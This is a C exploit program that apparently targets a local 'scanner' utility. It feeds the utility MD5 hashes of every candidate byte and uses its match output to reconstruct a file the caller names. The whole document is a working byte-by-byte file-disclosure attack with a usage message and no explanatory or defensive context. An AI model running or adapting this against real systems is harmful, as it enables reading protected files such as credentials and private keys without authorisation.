#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <openssl/md5.h>

void write_hashes(char* preffix, int preffix_length) {
        MD5_CTX ctx;
        FILE* fp;
        int c;
        int i;
        int length;
        char* str;
        char hash[33];
        unsigned char digest[16];

        length = preffix_length + 1;
        str = malloc(length + 1);

        fp = fopen("/tmp/hashes", "w");

        if (fp == NULL) {
                puts("[-] Failed to open /tmp/hashes");
                exit(1);
        }

        for (c = 0; c < 256; c++) {
                snprintf(str, length + 1, "%s%c", preffix, c);
                MD5_Init(&ctx);
                MD5_Update(&ctx, str, strlen(str));
                MD5_Final(digest, &ctx);

                for (i = 0; i < 16; i++) {
                        snprintf(hash + i * 2, 32, "%02x", digest[i]);
                }

                fprintf(fp, "%d:%s\n", c, hash);
        }

        fclose(fp);
        free(str);
}

char run_scanner(char* filename, int num_bytes) {
        FILE* fp;
        char cmd[256];
        char out[256];
        int i;

        snprintf(cmd, sizeof(cmd), "./scanner -l %d -c %s -h /tmp/hashes", num_bytes, filename);

        fp = popen(cmd, "r");

        if (fp == NULL) {
                puts("[-] Failed to run command");
                exit(1);
        }

        i = 0;
        memset(out, '\0', sizeof(out));

        while (!feof(fp)) {
                out[i++] = fgetc(fp);
        }

        if (out[4] == '\0') {
                return '\0';
        }

        *(strchr(&out[4], ' ')) = '\0';

        pclose(fp);

        return atoi(&out[4]);
}

int main(int argc, char* argv[]) {
        char content[4096];
        char* filename;
        char c;
        int length;

        if (argc < 2) {
                printf("[!] Usage: %s <file-to-read>\n", argv[0]);
                return 1;
        }

        filename = argv[1];
        length = 0;

        memset(content, '\0', sizeof(content));

        do {
                write_hashes(content, length);
                c = run_scanner(filename, length + 1);
                content[length++] = c;
        } while ((c != '\0') && (length != sizeof(content)));

        printf("%s", content);

        return 0;
}
